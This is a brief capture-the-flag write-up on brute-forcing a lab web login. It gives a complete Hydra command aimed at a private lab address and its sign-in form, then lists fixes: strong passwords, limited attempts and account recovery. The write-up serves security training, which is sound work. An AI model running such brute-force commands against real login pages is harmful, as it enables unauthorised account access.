# Brute Force Login

how i've found the flag:

first i've tried manually to login user random login users and password, i've noticed that theres no try attempts so i used a brute force tool to find the flag, in my case i've used -- HYDRA --, you may also use -- Limb --

```Bash

hydra -l /usr/share/wordlists/john.lst -P /usr/share/wordlists/john.lst -F -o hydra.log 10.13.100.113 http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif'

```

no need to guess the user login as it is doesn't matter since that server validate only pasword, in real life cases you must get user as well as pssword.

## how to resolve the patch :

1_ force users to use  strong password policy.
2_ give users few login tries (attempts)
3_ in case user used 3/4/5/(up to you) wrong password tries ask them to recover password by mail/number/...